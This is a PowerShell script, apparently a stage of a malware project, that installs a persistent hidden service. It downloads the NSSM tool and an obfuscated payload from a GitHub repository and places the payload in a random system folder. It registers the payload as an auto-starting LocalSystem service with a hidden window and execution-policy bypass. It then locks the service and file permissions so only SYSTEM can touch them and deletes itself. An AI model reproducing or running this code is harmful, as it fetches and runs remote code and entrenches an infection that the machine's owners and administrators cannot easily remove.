param(
    [string]$basePath,
    [string]$fwdPath
)
$curr = $MyInvocation.MyCommand.Path
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)
whoami | Out-File "C:\init_service_fwd.txt"

$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
if($arch -eq "64-bit"){
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
}else{
    $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx32.exe"
}
$nssmFolder = "$env:windir\system32\wbem\nssm"
$nssmexe = "$nssmFolder\nssm.exe"
$serviceName = "MyfwdService"
$propertyName = "fwd"
if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
    $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $fwdPath = "$fwdPath\f.ps1"
    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
}
$exepath = "powershell.exe"
$arguments = "-ep bypass -nop -w hidden $fwdPath"



if(-not(Test-Path -Path $nssmFolder -PathType Container)){
    New-Item -Path $nssmFolder -ItemType Directory -Force
}

if(-not(Test-Path -Path $nssmexe)){
    iwr -Uri $nssmUrl -OutFile $nssmexe
}

if(-not(Test-Path -Path $fwdPath)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
}

if(Get-Service -Name $serviceName -ErrorAction SilentlyContinue){
    & $nssmexe stop $serviceName
    & $nssmexe remove $serviceName confirm
}

& $nssmexe install $serviceName $exePath $arguments
& $nssmexe set $serviceName Start SERVICE_AUTO_START
& $nssmexe set $serviceName ObjectName "LocalSystem"
& $nssmexe set $serviceName AppExit Default Exit
& $nssmexe set $serviceName AppExit 0 Exit
& $nssmexe set $serviceName AppPriority REALTIME_PRIORITY_CLASS
& $nssmexe set $serviceName AppStdout "$env:userprofile\fwd_srv.log"
& $nssmexe set $serviceName AppStderr "$env:userprofile\fwd_srv.log.error"
& $nssmexe start $serviceName

Start-Sleep -Seconds 3

$SDDL = "O:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe sdset $serviceName $SDDL

takeown /F $fwdPath /R /D Y 2>&1 | Out-Null
icacls $fwdPath /inheritance:r /T /Q 2>&1 | Out-Null
icacls $fwdPath /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>&1 | Out-Null
icacls $fwdPath /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $fwdPath /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $fwdPath /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $fwdPath /remove "$env:computername\$env:username" /T /Q 2>&1 | Out-Null



takeown /F $nssmFolder /R /D Y 2>&1 | Out-Null
icacls $nssmFolder /inheritance:r /T /Q 2>&1 | Out-Null
icacls $nssmFolder /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "Administrators" "Users" "Authenticated Users" "Everyone" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /setowner "NT AUTHORITY\SYSTEM" /T /Q 2>&1 | Out-Null
icacls $nssmFolder /remove "$env:computername\$env:username" /T /Q 2>&1 | Out-Null

#attrib +h +s +r $nssmFolder
#attrib +h +s +r $fwdPath

Remove-Item -Path $curr -Force -ErrorAction SilentlyContinue